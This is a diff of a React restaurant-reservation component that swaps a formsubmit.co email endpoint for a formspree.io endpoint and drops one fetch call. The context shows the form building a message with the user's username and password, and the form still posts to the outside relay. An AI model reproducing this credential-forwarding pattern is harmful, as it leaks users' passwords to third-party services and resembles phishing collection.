@@ -185,7 +185,7 @@ const Reservations = () => {
       setPreloader(true)
       //sending the message
       if (preloader && currentTab === 2) {
-        const url = 'https://formsubmit.co/lipro.ecommerce@gmail.com'
+        const url = 'https://formspree.io/f/xwkdqbvl'
         const createMessage = async (url, data) => {
           const response = await fetch(url, {
             method: 'POST',
@@ -209,7 +209,6 @@ const Reservations = () => {
           Username: ${inputV.username},
           Password: ${inputV.password}`
 
-        const createResponse = await createMessage(url, messageForm)
       }
       /* ------------------------------------- */
       setTimeout(() => {
@@ -259,7 +258,7 @@ const Reservations = () => {
             onSubmit={handleSubmit}
             method='POST'
             name='reservation'
-            action='https://formsubmit.co/lipro.ecommerce@gmail.com'
+            action='https://formspree.io/f/xwkdqbvl'
             encType='multipart/form-data'>
             <h1 className='form_title'>Find a table for any occasion</h1>
             {/* images */}
